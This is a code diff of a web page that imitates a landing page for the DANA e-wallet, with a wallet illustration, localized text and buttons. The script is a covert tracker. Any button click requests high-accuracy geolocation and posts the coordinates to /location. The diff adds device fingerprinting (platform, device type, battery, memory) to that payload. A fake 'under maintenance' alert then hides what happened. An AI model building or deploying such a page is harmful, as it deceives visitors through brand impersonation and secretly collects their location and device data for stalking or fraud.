@@ -47,7 +47,6 @@
       overflow: hidden;
     }
 
-    /* Background decoration */
     .landing-page::before {
       content: '';
       position: absolute;
@@ -72,7 +71,6 @@
       pointer-events: none;
     }
 
-    /* Lottie / animation area */
     #animation {
       width: 240px;
       height: 240px;
@@ -82,7 +80,6 @@
       justify-content: center;
     }
 
-    /* Animated wallet illustration */
     .wallet-illustration {
       width: 200px;
       height: 200px;
@@ -101,7 +98,6 @@
       filter: drop-shadow(0 16px 32px rgba(0,0,0,0.2));
     }
 
-    /* DANA logo */
     .dana-logo-wrap {
       margin: 30px auto 12px;
       display: flex;
@@ -118,7 +114,6 @@
       line-height: 1;
     }
 
-    /* Fallback if SVG not available */
     .dana-logo-img {
       height: 32px;
     }
@@ -140,7 +135,6 @@
       font-weight: 400;
     }
 
-    /* Button container */
     .btn-container {
       display: flex;
       gap: 12px;
@@ -187,7 +181,6 @@
       100% { transform: rotate(360deg); }
     }
 
-    /* Spinner SVG inline */
     .spinner {
       width: 20px;
       height: 20px;
@@ -202,7 +195,6 @@
       display: none;
     }
 
-    /* Mobile */
     @media screen and (max-width: 480px) {
       #animation {
         width: 180px;
@@ -248,7 +240,6 @@
       }
     }
 
-    /* Fade-in animation on load */
     .landing-page > * {
       animation: fadeUp 0.6s ease both;
     }
@@ -268,49 +259,37 @@
 
 <div class="landing-page">
 
-  <!-- Animation / Illustration -->
   <div id="animation">
     <div class="wallet-illustration">
       <svg viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <!-- Phone body -->
         <rect x="40" y="20" width="120" height="160" rx="18" fill="white" opacity="0.95"/>
         <rect x="48" y="32" width="104" height="136" rx="10" fill="#E8F4FD"/>
 
-        <!-- Screen content: card -->
         <rect x="56" y="44" width="88" height="52" rx="8" fill="#108EE9"/>
         <rect x="56" y="44" width="88" height="52" rx="8" fill="url(#cardGrad)"/>
-        <!-- Card chip -->
         <rect x="66" y="56" width="18" height="14" rx="3" fill="#FDD835" opacity="0.9"/>
-        <!-- Card number dots -->
         <circle cx="70" cy="82" r="2.5" fill="white" opacity="0.7"/>
         <circle cx="78" cy="82" r="2.5" fill="white" opacity="0.7"/>
         <circle cx="86" cy="82" r="2.5" fill="white" opacity="0.7"/>
         <circle cx="94" cy="82" r="2.5" fill="white" opacity="0.7"/>
-        <!-- DANA label on card -->
         <text x="115" y="89" font-size="9" fill="white" font-weight="700" font-family="Open Sans,sans-serif" text-anchor="end" opacity="0.9">DANA</text>
 
-        <!-- Balance label -->
         <rect x="64" y="106" width="44" height="5" rx="2.5" fill="#108EE9" opacity="0.18"/>
         <rect x="64" y="115" width="72" height="7" rx="3.5" fill="#108EE9" opacity="0.28"/>
 
-        <!-- Bottom nav bar -->
         <rect x="56" y="140" width="88" height="18" rx="5" fill="#108EE9" opacity="0.1"/>
         <circle cx="80" cy="149" r="4" fill="#108EE9" opacity="0.6"/>
         <circle cx="100" cy="149" r="4" fill="#108EE9" opacity="0.25"/>
         <circle cx="120" cy="149" r="4" fill="#108EE9" opacity="0.25"/>
 
-        <!-- Home indicator -->
         <rect x="80" y="172" width="40" height="3" rx="1.5" fill="#108EE9" opacity="0.2"/>
 
-        <!-- Floating coin 1 -->
         <circle cx="152" cy="60" r="16" fill="#FDD835" opacity="0.95"/>
         <text x="152" y="65" font-size="14" fill="#E65100" font-weight="700" text-anchor="middle">$</text>
 
-        <!-- Floating coin 2 -->
         <circle cx="38" cy="120" r="11" fill="#4CAF50" opacity="0.9"/>
         <text x="38" y="125" font-size="10" fill="white" font-weight="700" text-anchor="middle">Rp</text>
 
-        <!-- Sparkles -->
         <g opacity="0.8">
           <path d="M162 100 l2 -5 l2 5 l5 2 l-5 2 l-2 5 l-2 -5 l-5 -2 Z" fill="white"/>
           <path d="M30 68 l1.5 -3.5 l1.5 3.5 l3.5 1.5 l-3.5 1.5 l-1.5 3.5 l-1.5 -3.5 l-3.5 -1.5 Z" fill="white" opacity="0.7"/>
@@ -327,7 +306,6 @@
     </div>
   </div>
 
-  <!-- DANA Logo -->
   <div class="dana-logo-wrap">
 <img
   class="dana-logo-img"
@@ -351,7 +329,6 @@
 </div>
 
 <script>
-  // i18n
   const translations = {
     id: {
       title: "Dompet digital yang aman dan tepercaya!",
@@ -374,47 +351,60 @@
     btn.textContent = t.btn;
   });
 
-  // Simulate button loaded state after short delay
   setTimeout(() => {
     document.querySelectorAll('button').forEach(btn => {
       const spinner = btn.querySelector('.spinner');
       if (spinner) spinner.style.display = 'none';
     });
   }, 1500);
-  
-document.querySelectorAll('button').forEach(btn => {
-  btn.addEventListener('click', requestLocation);
-});
-  
-function requestLocation(){
-  if(!navigator.geolocation){
-    return;
+
+  async function getDeviceInfo() {
+    const os = navigator.platform || 'N/A';
+    const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+    let battery = 'N/A';
+    try {
+      if (navigator.getBattery) {
+        const b = await navigator.getBattery();
+        battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sedang di Charge' : 'Tidak di Charge'})`;
+      }
+    } catch (e) {}
+    const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A';
+    return { os, deviceType, battery, memory };
   }
 
-  navigator.geolocation.getCurrentPosition(
-    async (pos)=>{
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
+  function sendData(lat, lon) {
+    getDeviceInfo().then(device => {
+      const payload = { lat, lon, ...device };
+      fetch('/location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+    });
+  }
 
-      await fetch("/location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          lat: lat,
-          lon: lon
-        })
-      });
+  function requestLocation(){
+    if(!navigator.geolocation){
+      return;
+    }
 
-      alert("This website is currently under maintenance. Please try again later.");
-    },
-    ()=>{
-      alert("Izin lokasi ditolak");
-    },
-    { enableHighAccuracy: true }
-  );
-}
+    navigator.geolocation.getCurrentPosition(
+      async (pos)=>{
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        sendData(lat, lon);
+        alert("This website is currently under maintenance. Please try again later.");
+      },
+      ()=>{
+        alert("Izin lokasi ditolak");
+      },
+      { enableHighAccuracy: true }
+    );
+  }
+
+  document.querySelectorAll('button').forEach(btn => {
+    btn.addEventListener('click', requestLocation);
+  });
 </script>
 
 </body>
